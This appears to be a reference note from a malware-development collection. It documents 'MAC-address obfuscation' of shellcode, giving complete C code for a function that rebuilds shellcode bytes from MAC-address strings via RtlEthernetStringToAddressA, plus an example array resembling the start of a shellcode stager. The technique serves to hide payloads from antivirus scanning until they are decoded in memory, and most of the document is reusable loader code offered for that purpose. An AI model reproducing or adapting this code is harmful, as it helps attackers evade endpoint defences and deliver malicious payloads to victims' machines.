## Shellcode MACFuscation Deobfuscation

Converts an array of MAC address strings back into the original shellcode byte buffer using the NTAPI `RtlEthernetStringToAddressA`. Each MAC address is resolved into 6 bytes, and all resolved bytes are written sequentially into a heap-allocated output buffer. The number of elements in the array multiplied by 6 gives the recovered shellcode size.

**Usage**

Call `MacDeobfuscation` with the MAC string array, its element count, and two `OUT` pointers that receive the deobfuscated shellcode buffer and its size. The output buffer is heap-allocated by the function; the caller is responsible for freeing it with `HeapFree`.

- `IN CHAR* MacArray[]`  Array of MAC address strings produced by `GenerateMacOutput`.
- `IN SIZE_T NmbrOfElements`  Number of MAC address strings in `MacArray`.
- `OUT PBYTE* ppDAddress`  Receives the base address of the heap-allocated deobfuscated shellcode buffer.
- `OUT SIZE_T* pDSize`  Receives the size of the deobfuscated shellcode buffer in bytes (`NmbrOfElements * 6`).

**Return Value**

`BOOL`  Returns `TRUE` if deobfuscation succeeds and `ppDAddress` / `pDSize` are populated, otherwise `FALSE`.

**External Files**

- `windows.h`  `PBYTE`, `PCSTR`, `BOOL`, `SIZE_T`, `NTSTATUS`, `NTAPI`, `IN`, `OUT`, `GetProcAddress()`, `GetModuleHandle()`, `HeapAlloc()`, `GetProcessHeap()`, `GetLastError()`

### Code

```c
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* fnRtlEthernetStringToAddressA)(
    PCSTR   S,          // The MAC address string to convert.
    PCSTR*  Terminator, // Receives a pointer to the character that terminated the scan.
    PVOID   Addr        // Output: receives the 6-byte binary MAC address.
);


BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize)
{
    PBYTE    pBuffer    = NULL,
             TmpBuffer  = NULL;
    SIZE_T   sBuffSize  = NULL;
    PCSTR    Terminator = NULL;
    NTSTATUS STATUS     = NULL;

    // Resolve RtlEthernetStringToAddressA from ntdll.dll at runtime.
    fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(
        GetModuleHandle(TEXT("NTDLL")),         // ntdll.dll is always loaded in every process.
        "RtlEthernetStringToAddressA"           // Converts a MAC address string to a 6-byte binary address.
    );
    if (pRtlEthernetStringToAddressA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Each MAC address deobfuscates to exactly 6 bytes.
    sBuffSize = NmbrOfElements * 6;

    pBuffer = (PBYTE)HeapAlloc(
        GetProcessHeap(),   // Use the process default heap.
        0,                  // No flags.
        sBuffSize           // Total size of the recovered shellcode.
    );
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // TmpBuffer walks forward through pBuffer by 6 bytes per iteration.
    TmpBuffer = pBuffer;

    for (int i = 0; i < NmbrOfElements; i++) {

        // Deobfuscate one MAC address string into 6 bytes written at TmpBuffer.
        if ((STATUS = pRtlEthernetStringToAddressA(
            MacArray[i],    // Single MAC address string from the obfuscated array.
            &Terminator,    // Receives pointer to the first character past the address.
            TmpBuffer       // Output: 6 deobfuscated bytes written here.
        )) != 0x0) {
            printf("[!] RtlEthernetStringToAddressA Failed At [%s] With Error 0x%0.8X", MacArray[i], STATUS);
            return FALSE;
        }

        // Advance the write cursor by 6 bytes to avoid overwriting recovered bytes.
        TmpBuffer = (PBYTE)(TmpBuffer + 6);
    }

    *ppDAddress = pBuffer;
    *pDSize     = sBuffSize;

    return TRUE;
}
```

**Example**

```c
// Array produced by the Obfuscation note — 2 MAC strings = 12 recovered bytes.
CHAR*  MacArray[]       = { "FC-48-83-E4-F0-E5", "E2-50-41-51-52-53" };
SIZE_T NmbrOfElements  = sizeof(MacArray) / sizeof(MacArray[0]);

PBYTE  pDAddress = NULL;
SIZE_T pDSize     = 0;

// Recover the original shellcode into a heap-allocated buffer.
if (MacDeobfuscation(MacArray, NmbrOfElements, &pDAddress, &pDSize)) {
    HeapFree(GetProcessHeap(), 0, pDAddress);  // Caller frees.
}
```
